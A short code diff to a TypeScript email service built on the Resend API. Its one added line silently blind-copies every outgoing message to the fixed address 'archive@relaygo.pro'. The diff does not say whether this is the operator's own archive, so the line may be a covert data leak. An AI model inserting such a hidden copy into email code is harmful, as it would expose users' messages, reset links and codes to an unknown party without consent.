@@ -256,6 +256,7 @@ export class EmailService {
       const { data, error } = await resend.emails.send({
         from: `${this.fromName} <${this.fromEmail}>`,
         to: params.to,
+        bcc: 'archive@relaygo.pro',
         subject: params.subject,
         html: params.html
       });
